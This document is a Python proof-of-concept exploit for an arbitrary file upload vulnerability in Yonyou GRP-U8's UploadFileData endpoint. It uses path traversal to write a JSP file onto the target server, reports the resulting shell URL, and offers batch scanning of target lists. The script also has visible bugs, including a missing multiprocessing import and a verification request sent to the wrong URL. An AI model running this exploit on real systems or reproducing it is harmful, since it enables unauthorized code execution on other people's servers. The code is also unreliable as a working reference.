import time
import requests
import re
import sys
from urllib.parse import quote
import argparse
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
hearderx={
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
}
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    console.print(now_time() +  ' [INFO]     正在检测用友 GRP-U8 UploadFileData 任意文件上传漏洞',style='bold blue')
    url = target_url + 'UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data",
        "Accept-Encoding": "gzip, deflate"
    }
    data='''------WebKitFormBoundary92pUawKc
Content-Disposition: form-data; name="myFile";filename="test.jpg"

<% out.println("123");%>
------WebKitFormBoundary92pUawKc--'''
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=url, headers=headers,data=data,verify=False)
        shell_url=target_url + 'R9iPortal/debugg.jsp'
        response = requests.get(url=url, headers=hearderx,verify=False)
        if response.status_code == 200 and "123" in response.text:
            console.print(now_time() + " [SUCCESS]  用友 GRP-U8 UploadFileData 任意文件上传漏洞，测试URL为: {}".format(shell_url),style='bold green')
        else:
            console.print(now_time() + " [WARNING]  用友 GRP-U8 UploadFileData 任意文件上传漏洞不存在", style='bold red')
    except:
        console.print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在', style='bold red')

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url')
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')